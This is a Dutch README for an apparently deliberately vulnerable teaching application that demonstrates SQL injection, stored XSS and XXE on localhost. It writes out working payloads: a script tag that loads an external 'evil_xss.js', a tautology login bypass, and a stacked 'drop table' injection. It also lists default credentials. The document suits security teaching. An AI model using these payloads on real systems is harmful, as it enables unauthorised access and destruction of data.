# OwaspVulnerabilities
<br>
In deze applicatie zijn drie vulnerabilities ingebouwd.<br>
<br>
Injection (sql en code)<br>
Cross site scripting XSS<br>
XML External Entity (XXE) Processing<br>
<br>
Injection (sql en code)<br>
Na het starten van de applicatie is er een H2 database met url: http://localhost:9080/h2-console/<br>
User is sa, password is leeg.<br>
<br>
Tabellen User en Article<br>
User wordt gebruikt om 'in te loggen' - SQL injectie<br>
Article wordt gebruikt om code te injecteren.<br>
<br>
Testen gaat via Swagger (http://localhost:9080/swagger-ui.html#/) en browser. Er is geen frontend.<br>
<br>
Code injectie <br>
<br>
Voeg middels 'addArticle' van de ArticleController een article toe met in het veld description: <br>
<code><script>alert('Hello')</script></code><br>
(id mag leeg blijven)<br>
In de response is het aangemaakte article te zien met het id.<br>
Gebruik dit id in 'getArticleById' om het article op te halen.<br>
Er gebeurt verder niets maar de code is te zien in de response.<br>
Kopieer de 'Request url' onder het Curl stukje (bijv. http://localhost:9080/api/article/getArticleById?id=2).<br>
Gebruik de url in de browser.<br>
Er is nu een alert melding te zien.<br>
Voek een nieuwe article toe met in het veld description:<br>
<code><script src='http://home.kpn.nl/vuwu57lx/evil_xss.js'></script></code><br>
Gebruik van de url van dit nieuwe article (bijv. http://localhost:9080/api/article/getArticleById?id=3)<br>
geeft nu een melding in de browser m.b.t. encrypted files<br>

---------------------------------------------------------------------------------------------------------<br>
SQL injectie<br>
<br>
De methode authenticate van de AuthenticationController wordt gebruikt om in te loggen.<br>
Bij verkeerde credentials wordt status 401 teruggegeven en een leeg user object.<br>
Bij de juiste credentials wordt een gevuld user object teruggegeven<br>
user nikki@info.org<br>
pw   S&cr#t<br>
In de logging is de gebruikte sql query te zien:<br>
SELECT * FROM User WHERE user = 'nikki@info.org' and password = 'S&cr#t'<br>
Het is nu de kunst om iets in het password in te vullen zodat een geldige query ontstaat die resultaat oplevert.<br>
Een voorbeeld is: ' or '1' = '1<br>
De query wordt dan:<br>
SELECT * FROM User WHERE user = 'nikki@info.org' and password = '' or '1' = '1'<br>
Het gevulde user object is dan te zien in de response<br>
Dit: ' or '1' = '1'   ; drop table article; --<br>
geeft query <br>
SELECT * FROM User WHERE user = 'nikki@info.org' and password = '' or '1' = '1'   ; drop table article; --'<br>
en heeft tot gevolg dat tabel article is verwijderd.<br>
<br>
---------------------------------------------------------------------------------------------------------<br>
XML External Entity (XXE) Processing<br>

In een XML bestand is het mogelijk om een DOCTYPE element op te nemen.<br>
Hierin kunnen uitvoerbare instructies staan<br>
XML parsers voeren deze instructies uit, afhankelijk van bepaalde settings.<br>
<br>
De RegisterXxeAttackController logt een dergelijke 'aanval'.<br>
Upload in Swagger via de XmlUploadController bestand ...src/main/resources/aanvraag.xml<br>
Het gevulde object wordt getoond in de response.<br>
Doe hetzelfde met ...src/main/resources/xxeaanvraag.xml<br>
In de logging is nu te zien:<br>
RegisterXxeAttackController      : Http request in !DOCTYPE element in xml is executed!<br>
<br>
<br>
N.B.<br>
In de pom staan dependencies voor jaxb omdat deze geen deel meer uitmaken van Java versies > 8<br>
Het kan zijn dat hier, afhankelijk van de gebruikte Java versie, problemen mee ontstaan.<br>




